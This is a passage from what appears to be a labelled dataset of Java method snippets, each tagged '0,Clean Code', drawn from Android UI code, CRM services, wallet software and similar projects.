",0,Clean Code
"private List<DeptVO> createTree(int pid,List<DeptVO> deptList){
  List<DeptVO> treeDept=new ArrayList<>();
  for (  DeptVO dept : deptList) {
    if (pid == dept.getPid()) {
      treeDept.add(dept);
      List<DeptVO> children=createTree(dept.getDeptId(),deptList);
      for (      DeptVO child : children) {
        dept.setAllNum(dept.getAllNum() + child.getAllNum());
        dept.setFullTimeNum(dept.getFullTimeNum() + child.getFullTimeNum());
        dept.setNuFullTimeNum(dept.getNuFullTimeNum() + child.getNuFullTimeNum());
      }
      dept.setChildren(children);
    }
  }
  return treeDept;
}
",0,Clean Code
"@Override public void notifyCheckpointComplete(long checkpointId){
  if (checkpointIdToFinish != null && isAssigningSnapshotSplits(assignerStatus) && allSnapshotSplitsFinished()) {
    if (checkpointId >= checkpointIdToFinish) {
      assignerStatus=assignerStatus.onFinish();
    }
    LOG.info(""Snapshot split assigner is turn into finished status."");
  }
}
",0,Clean Code
"public ListPreferenceData createListPreferenceData(List<OptionItem> items){
  CharSequence[] titles=new CharSequence[items.size()];
  CharSequence[] hashes=new CharSequence[items.size()];
  String defaultValue=null;
  Set<String> defaultValues=new HashSet<>();
  for (int i=0; i < items.size(); i++) {
    OptionItem optionItem=items.get(i);
    CharSequence title=optionItem.getTitle();
    String value=optionItem.toString();
    if (optionItem.getDescription() != null) {
      title=TextUtils.concat(title,""\n"",Utils.italic(optionItem.getDescription()));
    }
    titles[i]=title;
    hashes[i]=value;
    if (optionItem.isSelected()) {
      defaultValue=value;
      defaultValues.add(value);
    }
  }
  return new ListPreferenceData(titles,hashes,defaultValue,defaultValues);
}",0,Clean Code
"@WorkerThread private void generateApkChecksumsAndFetchScanReports(){
  waitForFile();
  Path file=Paths.getUnprivileged(mApkFile);
  String pithusReportUrl=null;
  Pair<String,String>[] digests=ExUtils.exceptionAsNull(() -> DigestUtils.getDigests(file));
  mApkChecksumsLiveData.postValue(digests);
  if (digests != null && FeatureController.isInternetEnabled()) {
    String sha256=digests[2].second;
    pithusReportUrl=ExUtils.exceptionAsNull(() -> Pithus.resolveReport(sha256));
  }
  mPithusReportLiveData.postValue(pithusReportUrl);
  if (mVt != null && digests != null && FeatureController.isVirusTotalEnabled()) {
    String md5=digests[0].second;
    try {
      mVt.fetchReportsOrScan(file,md5,this);
    }
 catch (    IOException e) {
      e.printStackTrace();
      mVtFileReportLiveData.postValue(null);
    }
  }
 else   mVtFileReportLiveData.postValue(null);
}",0,Clean Code
"private boolean checkDiscard(){
  String newBannedRights=ChatObject.getBannedRightsString(defaultBannedRights);
  if (!newBannedRights.equals(initialBannedRights) || initialSlowmode != selectedSlowmode || hasNotRestrictBoostersChanges()) {
    AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
    builder.setTitle(LocaleController.getString(""UserRestrictionsApplyChanges"",R.string.UserRestrictionsApplyChanges));
    if (isChannel) {
      builder.setMessage(LocaleController.getString(""ChannelSettingsChangedAlert"",R.string.ChannelSettingsChangedAlert));
    }
 else {
      builder.setMessage(LocaleController.getString(""GroupSettingsChangedAlert"",R.string.GroupSettingsChangedAlert));
    }
    builder.setPositiveButton(LocaleController.getString(""ApplyTheme"",R.string.ApplyTheme),(dialogInterface,i) -> processDone());
    builder.setNegativeButton(LocaleController.getString(""PassportDiscard"",R.string.PassportDiscard),(dialog,which) -> finishFragment());
    showDialog(builder.create());
    return false;
  }
  return true;
}
",0,Clean Code
"@Override public List<JSONObject> queryRecordCount(BiParams biParams){
  BiAuthority biAuthority=handleDataType(biParams);
  List<Long> userIds=biAuthority.getUserIds();
  if (CollUtil.isEmpty(userIds)) {
    return new ArrayList<>();
  }
  Integer type=BiTimeUtil.analyzeType(biParams.getType());
  Dict kv=Dict.create().set(""type"",type).set(""startTime"",biParams.getStartTime()).set(""endTime"",biParams.getEndTime());
  kv.put(""businessUserIds"",AuthUtil.filterUserIdList(CrmEnum.BUSINESS,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  kv.put(""contactsUserIds"",AuthUtil.filterUserIdList(CrmEnum.CONTACTS,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  kv.put(""customerUserIds"",AuthUtil.filterUserIdList(CrmEnum.CUSTOMER,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  kv.put(""receivablesUserIds"",AuthUtil.filterUserIdList(CrmEnum.RECEIVABLES,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  kv.put(""contractUserIds"",AuthUtil.filterUserIdList(CrmEnum.CONTRACT,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  kv.put(""leadsUserIds"",AuthUtil.filterUserIdList(CrmEnum.LEADS,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  kv.put(""recordUserIds"",AuthUtil.filterUserIdList(null,CrmAuthEnum.LIST,biAuthority.getUserIds()));
  List<JSONObject> recordList=crmInstrumentMapper.queryRecordCount(kv);
  if (recordList.stream().noneMatch(record -> CrmEnum.LEADS.getType().equals(record.getInteger(""crmType"")))) {
    recordList.add(new JSONObject().fluentPut(""crmType"",CrmEnum.LEADS.getType()).fluentPut(""count"",0));
  }
  if (recordList.stream().noneMatch(record -> CrmEnum.CUSTOMER.getType().equals(record.getInteger(""crmType"")))) {
    recordList.add(new JSONObject().fluentPut(""crmType"",CrmEnum.CUSTOMER.getType()).fluentPut(""count"",0));
  }
  if (recordList.stream().noneMatch(record -> CrmEnum.CONTACTS.getType().equals(record.getInteger(""crmType"")))) {
    recordList.add(new JSONObject().fluentPut(""crmType"",CrmEnum.CONTACTS.getType()).fluentPut(""count"",0));
  }
  if (recordList.stream().noneMatch(record -> CrmEnum.BUSINESS.getType().equals(record.getInteger(""crmType"")))) {
    recordList.add(new JSONObject().fluentPut(""crmType"",CrmEnum.BUSINESS.getType()).fluentPut(""count"",0));
  }
  if (recordList.stream().noneMatch(record -> CrmEnum.CONTRACT.getType().equals(record.getInteger(""crmType"")))) {
    recordList.add(new JSONObject().fluentPut(""crmType"",CrmEnum.CONTRACT.getType()).fluentPut(""count"",0));
  }
  return recordList;
}",0,Clean Code
"private void mockReadSuccess(int position,int length){
  final int[] positionAndRemaining=new int[]{position,length};
  doAnswer(invocation -> {
    if (positionAndRemaining[1] == 0) {
      dataSourceUnderTest.urlRequestCallback.onSucceeded(mockUrlRequest,testUrlResponseInfo);
    }
 else {
      ByteBuffer inputBuffer=(ByteBuffer)invocation.getArguments()[0];
      int readLength=Math.min(positionAndRemaining[1],inputBuffer.remaining());
      inputBuffer.put(buildTestDataBuffer(positionAndRemaining[0],readLength));
      positionAndRemaining[0]+=readLength;
      positionAndRemaining[1]-=readLength;
      dataSourceUnderTest.urlRequestCallback.onReadCompleted(mockUrlRequest,testUrlResponseInfo,inputBuffer);
    }
    return null;
  }
).when(mockUrlRequest).read(any(ByteBuffer.class));
}",0,Clean Code
"private boolean checkPinchToZoom(MotionEvent ev){
  PinchToZoomHelper pinchToZoomHelper=delegate == null ? null : delegate.getPinchToZoomHelper();
  if (currentMessageObject == null || !photoImage.hasNotThumb() || pinchToZoomHelper == null || currentMessageObject.isSticker() || currentMessageObject.isAnimatedEmoji() || (currentMessageObject.isVideo() && !autoPlayingMedia) || isRoundVideo || currentMessageObject.isAnimatedSticker() || (currentMessageObject.isDocument() && !currentMessageObject.isGif()) || currentMessageObject.needDrawBluredPreview()) {
    return false;
  }
  return pinchToZoomHelper.checkPinchToZoom(ev,this,photoImage,currentMessageObject);
}
",0,Clean Code
"/** 
 * Returns all the supported modes.
 * @return An array of{@link Mode Mode} objectsor NULL if an error occurred.
 */
public Mode[] getSupportedModes(){
  Mode[] returnedSupportedModes={};
  try {
    Class<?> classToInvestigate=Class.forName(sDisplayClassName);
    Method getSupportedMethod=classToInvestigate.getDeclaredMethod(sSupportedModesMethodName);
    Object[] SupportedModes=(Object[])getSupportedMethod.invoke(getCurrentDisplay());
    returnedSupportedModes=new Mode[SupportedModes.length];
    int i=0;
    for (    Object mode : SupportedModes) {
      returnedSupportedModes[i++]=convertReturnedModeToInternalMode(mode);
    }
  }
 catch (  Exception e) {
    Log.e(TAG,""error getting modes"",e);
  }
  return returnedSupportedModes;
}",0,Clean Code
"private void validateParams(Metrics metrics) throws Exception {
  if (metrics == null || metrics.getPrometheus() == null) {
    throw new Exception(""Prometheus collect must has prometheus params"");
  }
  PrometheusProtocol protocol=metrics.getPrometheus();
  if (protocol.getPath() == null || """".equals(protocol.getPath()) || !protocol.getPath().startsWith(RIGHT_DASH)) {
    protocol.setPath(protocol.getPath() == null ? RIGHT_DASH : RIGHT_DASH + protocol.getPath().trim());
  }
}
",0,Clean Code
"@Override public Map<Integer,Double> getFeeEstimates(Transport transport,List<Integer> targetBlocks){
  PagedBatchRequestBuilder<Integer,Double> batchRequest=PagedBatchRequestBuilder.create(transport,idCounter).keysType(Integer.class).returnType(Double.class);
  for (  Integer targetBlock : targetBlocks) {
    batchRequest.add(targetBlock,""blockchain.estimatefee"",targetBlock);
  }
  try {
    return batchRequest.execute();
  }
 catch (  JsonRpcBatchException e) {
    throw new ElectrumServerRpcException(""Error getting fee estimates from connected server: "" + e.getErrors(),e);
  }
catch (  Exception e) {
    throw new ElectrumServerRpcException(""Error getting fee estimates for target blocks: "" + targetBlocks,e);
  }
}
",0,Clean Code
"@Override protected void onBindRowViewHolder(RowPresenter.ViewHolder holder,Object item){
  super.onBindRowViewHolder(holder,item);
  ViewHolder vh=(ViewHolder)holder;
  PlaybackControlsRow row=(PlaybackControlsRow)vh.getRow();
  if (row.getItem() == null) {
    vh.mDescriptionDock.setVisibility(View.GONE);
  }
 else {
    vh.mDescriptionDock.setVisibility(View.VISIBLE);
    if (vh.mDescriptionViewHolder != null) {
      mDescriptionPresenter.onBindViewHolder(vh.mDescriptionViewHolder,row.getItem());
    }
  }
  if (row.getImageDrawable() == null) {
    vh.mImageView.setVisibility(View.GONE);
  }
 else {
    vh.mImageView.setVisibility(View.VISIBLE);
  }
  vh.mImageView.setImageDrawable(row.getImageDrawable());
  vh.mControlsBoundData.adapter=row.getPrimaryActionsAdapter();
  vh.mControlsBoundData.presenter=vh.getPresenter(true);
  vh.mControlsBoundData.mRowViewHolder=vh;
  mPlaybackControlsPresenter.onBindViewHolder(vh.mControlsVh,vh.mControlsBoundData);
  vh.mSecondaryBoundData.adapter=row.getSecondaryActionsAdapter();
  vh.mSecondaryBoundData.presenter=vh.getPresenter(false);
  vh.mSecondaryBoundData.mRowViewHolder=vh;
  mSecondaryControlsPresenter.onBindViewHolder(vh.mSecondaryControlsVh,vh.mSecondaryBoundData);
  vh.setTotalTime(row.getDuration());
  vh.setCurrentPosition(row.getCurrentPosition());
  vh.setBufferedPosition(row.getBufferedPosition());
  row.setOnPlaybackProgressChangedListener(vh.mListener);
}
",0,Clean Code
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public int addRecipes(Collection<RecipeHolder<?>> p_12792_,ServerPlayer p_12793_){
  List<ResourceLocation> list=Lists.newArrayList();
  int i=0;
  for (  RecipeHolder<?> recipeholder : p_12792_) {
    ResourceLocation resourcelocation=recipeholder.id();
    if (!this.known.contains(resourcelocation) && !recipeholder.value().isSpecial() && CraftEventFactory.handlePlayerRecipeListUpdateEvent(p_12793_,resourcelocation)) {
      this.add(resourcelocation);
      this.addHighlight(resourcelocation);
      list.add(resourcelocation);
      CriteriaTriggers.RECIPE_UNLOCKED.trigger(p_12793_,recipeholder);
      ++i;
    }
  }
  if (list.size() > 0) {
    this.sendRecipes(ClientboundRecipePacket.State.ADD,p_12793_,list);
  }
  return i;
}",0,Clean Code
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  setPivotX(getMeasuredWidth() / 2);
  setPivotY(getMeasuredHeight());
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  if (bubbleX != null) {
    setPivotX(bubbleX);
  }
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(heightMeasureSpec) + AndroidUtilities.dp(36),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  if (bubbleX != null) {
    setPivotX(bubbleX);
  }
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(52),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(AndroidUtilities.dp(26)),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(30),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  setPadding(AndroidUtilities.dp(5),AndroidUtilities.dp(8),AndroidUtilities.dp(5),AndroidUtilities.dp(8));
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(44) + getPaddingTop() + getPaddingBottom(),MeasureSpec.EXACTLY));
}
@Override public void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(MeasureSpec.makeMeasureSpec(View.MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(View.MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  if (drawBackground && type != TYPE_TOPIC_ICON && type != TYPE_AVATAR_CONSTRUCTOR) {
    super.onMeasure(MeasureSpec.makeMeasureSpec((int)Math.min(AndroidUtilities.dp(340 - 16),AndroidUtilities.displaySize.x * .95f),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)Math.min(AndroidUtilities.dp(410 - 16 - 64),AndroidUtilities.displaySize.y * .75f),MeasureSpec.AT_MOST));
  }
 else   if (type == TYPE_CHAT_REACTIONS) {
    super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec((int)(AndroidUtilities.displaySize.y * .35f),MeasureSpec.AT_MOST));
  }
 else {
    super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  }
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(8 + 36 + 8),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(heightMeasureSpec),MeasureSpec.EXACTLY));
}",0,Clean Code
"public void updateHistory(List<WalletNode> updatedNodes){
  NodeEntry rootEntry=(NodeEntry)getRoot().getValue();
  Map<WalletNode,NodeEntry> childNodes=new HashMap<>();
  for (  Entry childEntry : rootEntry.getChildren()) {
    NodeEntry nodeEntry=(NodeEntry)childEntry;
    childNodes.put(nodeEntry.getNode(),nodeEntry);
  }
  for (  WalletNode updatedNode : updatedNodes) {
    NodeEntry existingEntry=childNodes.get(updatedNode);
    if (existingEntry != null) {
      existingEntry.refreshChildren();
      if (Config.get().isHideEmptyUsedAddresses() && existingEntry.getValue() == 0L) {
        rootEntry.getChildren().remove(existingEntry);
      }
    }
 else {
      NodeEntry nodeEntry=new NodeEntry(rootEntry.getWallet(),updatedNode);
      if (Config.get().isHideEmptyUsedAddresses()) {
        int index=0;
        for (; index < rootEntry.getChildren().size(); index++) {
          existingEntry=(NodeEntry)rootEntry.getChildren().get(index);
          if (nodeEntry.compareTo(existingEntry) < 0) {
            break;
          }
        }
        rootEntry.getChildren().add(index,nodeEntry);
      }
 else {
        rootEntry.getChildren().add(nodeEntry);
      }
    }
  }
  refresh();
}",0,Clean Code
"@RequestMapping(value=""/metrics"",method=RequestMethod.GET) public JSONObject metrics(HttpServletRequest request){
  JSONObject result=new JSONObject();
  int serviceCount=serviceManager.getServiceCount();
  int ipCount=serviceManager.getInstanceCount();
  int responsibleDomCount=serviceManager.getResponsibleServiceCount();
  int responsibleIPCount=serviceManager.getResponsibleInstanceCount();
  result.put(""status"",serverStatusManager.getServerStatus().name());
  result.put(""serviceCount"",serviceCount);
  result.put(""instanceCount"",ipCount);
  result.put(""raftNotifyTaskCount"",raftCore.getNotifyTaskCount());
  result.put(""responsibleServiceCount"",responsibleDomCount);
  result.put(""responsibleInstanceCount"",responsibleIPCount);
  result.put(""cpu"",SystemUtils.getCPU());
  result.put(""load"",SystemUtils.getLoad());
  result.put(""mem"",SystemUtils.getMem());
  return result;
}
",0,Clean Code
"@Override @SuppressWarnings(""unchecked"") @NonNull public SuggestionResults getSuggestionResults(ComposedData composedData,NgramContext ngramContext,@NonNull final Keyboard keyboard,SettingsValuesForSuggestion settingsValuesForSuggestion,int sessionId,int inputStyle){
  long proximityInfoHandle=keyboard.getProximityInfo().getNativeProximityInfo();
  final SuggestionResults suggestionResults=new SuggestionResults(SuggestedWords.MAX_SUGGESTIONS,ngramContext.isBeginningOfSentenceContext(),false);
  final float[] weightOfLangModelVsSpatialModel=new float[]{Dictionary.NOT_A_WEIGHT_OF_LANG_MODEL_VS_SPATIAL_MODEL};
  final ArrayList<SuggestedWordInfo>[] otherDictionarySuggestions=(ArrayList<SuggestedWordInfo>[])new ArrayList[mDictionaryGroups.size() - 1];
  final CountDownLatch waitForOtherDictionaries;
  if (mDictionaryGroups.size() > 1) {
    waitForOtherDictionaries=new CountDownLatch(mDictionaryGroups.size() - 1);
    for (int i=1; i < mDictionaryGroups.size(); i++) {
      final DictionaryGroup dictionaryGroup=mDictionaryGroups.get(i);
      final int index=i - 1;
      ExecutorUtils.getBackgroundExecutor(ExecutorUtils.KEYBOARD).execute(() -> {
        otherDictionarySuggestions[index]=getSuggestions(composedData,ngramContext,settingsValuesForSuggestion,sessionId,proximityInfoHandle,weightOfLangModelVsSpatialModel,dictionaryGroup);
        waitForOtherDictionaries.countDown();
      }
);
    }
  }
 else   waitForOtherDictionaries=null;
  final ArrayList<SuggestedWordInfo> dictionarySuggestions=getSuggestions(composedData,ngramContext,settingsValuesForSuggestion,sessionId,proximityInfoHandle,weightOfLangModelVsSpatialModel,mDictionaryGroups.get(0));
  suggestionResults.addAll(dictionarySuggestions);
  if (null != suggestionResults.mRawSuggestions) {
    suggestionResults.mRawSuggestions.addAll(dictionarySuggestions);
  }
  if (waitForOtherDictionaries != null) {
    try {
      waitForOtherDictionaries.await();
    }
 catch (    InterruptedException e) {
      Log.w(TAG,""Interrupted while trying to get secondary locale suggestions"",e);
    }
    for (int i=1; i < mDictionaryGroups.size(); i++) {
      suggestionResults.addAll(otherDictionarySuggestions[i - 1]);
      if (null != suggestionResults.mRawSuggestions) {
        suggestionResults.mRawSuggestions.addAll(otherDictionarySuggestions[i - 1]);
      }
    }
  }
  return suggestionResults;
}",0,Clean Code
"/** 
 * 鏋勫缓鍙傛暟鏍￠獙閿欒杩斿洖缁撴灉 浣跨敤Spring鐨勫弬鏁版牎楠屽櫒
 * @param result
 * @return
 */
public static TeslaResult buildValidationResult(BindingResult result){
  Map<String,String> errorMap=new HashMap<>(10);
  List<FieldError> fieldErrors=result.getFieldErrors();
  for (  FieldError error : fieldErrors) {
    errorMap.put(error.getField(),error.getDefaultMessage());
  }
  TeslaResult ret=new TeslaResult();
  ret.setCode(TeslaResult.BAD_REQUEST);
  ret.setData(errorMap);
  List<String> errorMessages=new ArrayList<>();
  for (  Entry<String,String> entry : errorMap.entrySet()) {
    errorMessages.add(entry.getKey() + "": "" + entry.getValue());
  }
  ret.setMessage(""鍙傛暟閿欒锛� "" + String.join("", "",errorMessages));
  return ret;
}",0,Clean Code
"private int getStatusBarHeight(){
  if (isFullScreen() || getDecorView() == null) {
    return 0;
  }
  WindowInsetsController insetsController=(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) ? getDecorView().getWindowInsetsController() : null;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && insetsController != null && (insetsController.getSystemBarsBehavior() & View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR) == 0) {
    return 0;
  }
  Resources res;
  if (contentView == null || contentView.getContext() == null) {
    res=Resources.getSystem();
  }
 else {
    res=contentView.getContext().getResources();
  }
  int result=0;
  int resourceId=res.getIdentifier(""status_bar_height"",""dimen"",""android"");
  if (resourceId > 0) {
    result=res.getDimensionPixelSize(resourceId);
  }
  return result;
}",0,Clean Code
"public static String adjustPath(OpenFileSystemModel model,String path){
  if (path == null) {
    return null;
  }
  path=path.trim();
  if (path.isBlank()) {
    return null;
  }
  if (path.startsWith(""\"""") && path.endsWith(""\"""")) {
    path=path.substring(1,path.length() - 1);
  }
 else   if (path.startsWith(""'"") && path.endsWith(""'"")) {
    path=path.substring(1,path.length() - 1);
  }
  if (model.getFileSystem() == null) {
    return path;
  }
  var shell=model.getFileSystem().getShell();
  if (shell.isEmpty()) {
    return path;
  }
  if (shell.get().getOsType().equals(OsType.WINDOWS) && path.length() == 2 && path.endsWith("":"")) {
    return path + ""\\"";
  }
  return path;
}",0,Clean Code
"private void generateSetting(Customizations customizations){
  if (ShadowOverlayContainer.supportsDynamicShadow()) {
    mPreferStaticShadows=false;
    if (customizations != null) {
      mPreferStaticShadows=customizations.getBoolean(""leanback_prefer_static_shadows"",mPreferStaticShadows);
    }
  }
 else {
    mPreferStaticShadows=true;
  }
  if (Build.VERSION.SDK_INT >= 21) {
    mOutlineClippingDisabled=false;
    if (customizations != null) {
      mOutlineClippingDisabled=customizations.getBoolean(""leanback_outline_clipping_disabled"",mOutlineClippingDisabled);
    }
  }
 else {
    mOutlineClippingDisabled=true;
  }
  if (DEBUG)   Log.v(TAG,""generated preference "" + PREFER_STATIC_SHADOWS + "": ""+ mPreferStaticShadows+ "" ""+ OUTLINE_CLIPPING_DISABLED+ "" : ""+ mOutlineClippingDisabled);
}",0,Clean Code
"/** 
 * Creates a new expandable binary dictionary.
 * @param context The application context of the parent.
 * @param dictName The name of the dictionary. Multiple instances with the samename is supported.
 * @param locale the dictionary locale.
 * @param dictType the dictionary type, as a human-readable string
 * @param dictFile dictionary file path. if null, use default dictionary path based ondictionary type.
 */
public ExpandableBinaryDictionary(final Context context,final String dictName,final Locale locale,final String dictType,final File dictFile){
  super(dictType,locale);
  mDictName=dictName;
  mContext=context;
  mDictFile=getDictFile(context,dictName,dictFile);
  mBinaryDictionary=null;
  mIsReloading=new AtomicBoolean();
  mNeedsToRecreate=false;
  mLock=new ReentrantReadWriteLock();
}
",0,Clean Code
"private int getDelay(View view){
  Integer delay=mViewStartDelays.get(view);
  if (delay != null) {
    return delay;
  }
  int idStartDelay=mIdStartDelays.get(view.getId(),-1);
  if (idStartDelay != -1) {
    return idStartDelay;
  }
  delay=mClassStartDelays.get(view.getClass().getName());
  if (delay != null) {
    return delay;
  }
  return mDefaultStartDelay;
}",0,Clean Code
"@SuppressWarnings(""ReferenceEquality"") private void calculateUsingSubtitleTextSize(final float size){
  if (subtitle == null) {
    return;
  }
  final float collapsedWidth=collapsedBounds.width();
  final float expandedWidth=expandedBounds.width();
  final float availableWidth;
  final float newTextSize;
  boolean updateDrawText=false;
  if (isClose(size,collapsedSubtitleTextSize)) {
    newTextSize=collapsedSubtitleTextSize;
    subtitleScale=1f;
    if (currentSubtitleTypeface != collapsedSubtitleTypeface) {
      currentSubtitleTypeface=collapsedSubtitleTypeface;
      updateDrawText=true;
    }
    availableWidth=collapsedWidth;
  }
 else {
    newTextSize=expandedSubtitleTextSize;
    if (currentSubtitleTypeface != expandedSubtitleTypeface) {
      currentSubtitleTypeface=expandedSubtitleTypeface;
      updateDrawText=true;
    }
    if (isClose(size,expandedSubtitleTextSize)) {
      subtitleScale=1f;
    }
 else {
      subtitleScale=size / expandedSubtitleTextSize;
    }
    final float textSizeRatio=collapsedSubtitleTextSize / expandedSubtitleTextSize;
    final float scaledDownWidth=expandedWidth * textSizeRatio;
    if (scaledDownWidth > collapsedWidth) {
      availableWidth=Math.min(collapsedWidth / textSizeRatio,expandedWidth);
    }
 else {
      availableWidth=expandedWidth;
    }
  }
  if (availableWidth > 0) {
    updateDrawText=(currentSubtitleTextSize != newTextSize) || boundsChanged || updateDrawText;
    currentSubtitleTextSize=newTextSize;
    boundsChanged=false;
  }
  if (subtitleToDraw == null || updateDrawText) {
    subtitleTextPaint.setTextSize(currentSubtitleTextSize);
    subtitleTextPaint.setTypeface(currentSubtitleTypeface);
    subtitleTextPaint.setLinearText(subtitleScale != 1f);
    final CharSequence text=TextUtils.ellipsize(this.subtitle,subtitleTextPaint,availableWidth,TextUtils.TruncateAt.END);
    if (!TextUtils.equals(text,subtitleToDraw)) {
      subtitleToDraw=text;
      isRtl=calculateIsRtl(subtitleToDraw);
    }
  }
}",0,Clean Code
"@Override public void run(){
  try {
    File switchFile=new File(failoverDir + UtilAndComs.FAILOVER_SWITCH);
    if (!switchFile.exists()) {
      switchParams.put(""failover-mode"",""false"");
      NAMING_LOGGER.debug(""failover switch is not found, "" + switchFile.getName());
      return;
    }
    long modified=switchFile.lastModified();
    if (lastModifiedMillis < modified) {
      lastModifiedMillis=modified;
      String failover=ConcurrentDiskUtil.getFileContent(failoverDir + UtilAndComs.FAILOVER_SWITCH,Charset.defaultCharset().toString());
      if (!StringUtils.isEmpty(failover)) {
        List<String> lines=Arrays.asList(failover.split(DiskCache.getLineSeparator()));
        for (        String line : lines) {
          String line1=line.trim();
          if (""1"".equals(line1)) {
            switchParams.put(""failover-mode"",""true"");
            NAMING_LOGGER.info(""failover-mode is on"");
            new FailoverFileReader().run();
          }
 else           if (""0"".equals(line1)) {
            switchParams.put(""failover-mode"",""false"");
            NAMING_LOGGER.info(""failover-mode is off"");
          }
        }
      }
 else {
        switchParams.put(""failover-mode"",""false"");
      }
    }
  }
 catch (  Throwable e) {
    NAMING_LOGGER.error(""[NA] failed to read failover switch."",e);
  }
}",0,Clean Code
"void dispatchItemSelection(){
  if (!isSelected()) {
    return;
  }
  if (mSelectedViewHolder == null) {
    if (getOnItemViewSelectedListener() != null) {
      getOnItemViewSelectedListener().onItemSelected(null,null,ViewHolder.this,getRow());
    }
  }
 else {
    if (getOnItemViewSelectedListener() != null) {
      getOnItemViewSelectedListener().onItemSelected(mSelectedViewHolder,mSelectedItem,ViewHolder.this,getRow());
    }
  }
}
",0,Clean Code
"@Override protected List<Item> parseImpl(String str){
  String[] values=str.split("","");
  List<Item> items=new ArrayList<>(values.length);
  try {
    for (    String value : values) {
      Item item=parseId(Registries.ITEM,value);
      if (item != null && (filter == null || filter.test(item)))       items.add(item);
    }
  }
 catch (  Exception ignored) {
  }
  return items;
}
",0,Clean Code
"@Override public Activity newActivity(ClassLoader cl,String className,Intent intent) throws ClassNotFoundException, IllegalAccessException, InstantiationException {
  LOGGER.v(""newActivity: %s"",className);
  if (suiActivityConstructor == null) {
    return original.newActivity(cl,className,intent);
  }
  Bundle extras=intent.getExtras();
  if (extras != null) {
    extras.setClassLoader(cl);
    if (extras.getInt(SHORTCUT_EXTRA,-1) != -1) {
      LOGGER.v(""creating SuiActivity"");
      try {
        return (Activity)suiActivityConstructor.newInstance(application,resources);
      }
 catch (      InvocationTargetException e) {
        LOGGER.e(e,""Cannot create activity"");
      }
    }
  }
  return original.newActivity(cl,className,intent);
}
@Override public Activity newActivity(Class<?> clazz,Context context,IBinder token,Application application,Intent intent,ActivityInfo info,CharSequence title,Activity parent,String id,Object lastNonConfigurationInstance) throws IllegalAccessException, InstantiationException {
  return original.newActivity(clazz,context,token,application,intent,info,title,parent,id,lastNonConfigurationInstance);
}",0,Clean Code
"@Override public void onClick(final View v){
  if (v == mActionFinish) {
    finish();
    return;
  }
  final int currentStep=determineSetupStepNumber();
  final int nextStep;
  if (v == mActionStart) {
    nextStep=STEP_1;
  }
 else   if (v == mActionNext) {
    nextStep=mStepNumber + 1;
  }
 else   if (v == mStep1Bullet && currentStep == STEP_2) {
    nextStep=STEP_1;
  }
 else {
    nextStep=mStepNumber;
  }
  if (mStepNumber != nextStep) {
    mStepNumber=nextStep;
    updateSetupStepView();
  }
}
@Override public void onClick(final View v){
  if (v == mActionLabel && mAction != null)   mAction.run();
}",0,Clean Code
"@SneakyThrows(IllegalAccessException.class) private static void visitGLConstant(@NonNull MethodVisitor mv,int constant){
  DEBUG:   if (OpenGL.DEBUG) {
    Field matchingField=null;
    for (    Field field : OpenGLConstants.class.getFields()) {
      if ((field.getModifiers() & Modifier.STATIC) != 0 && field.getType() == int.class && !field.getName().endsWith(""_EXT"") && ((Integer)field.get(null)) == constant) {
        if (matchingField != null) {
          break DEBUG;
        }
        matchingField=field;
      }
    }
    if (matchingField != null) {
      mv.visitFieldInsn(GETSTATIC,getInternalName(OpenGLConstants.class),matchingField.getName(),INT_TYPE.getDescriptor());
      return;
    }
  }
  mv.visitLdcInsn(constant);
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void writeAppraisal(WriteAppraisalBO writeAppraisalBO){
  Integer employeeId=EmployeeHolder.getEmployeeId();
  Integer employeeAppraisalId=writeAppraisalBO.getEmployeeAppraisalId();
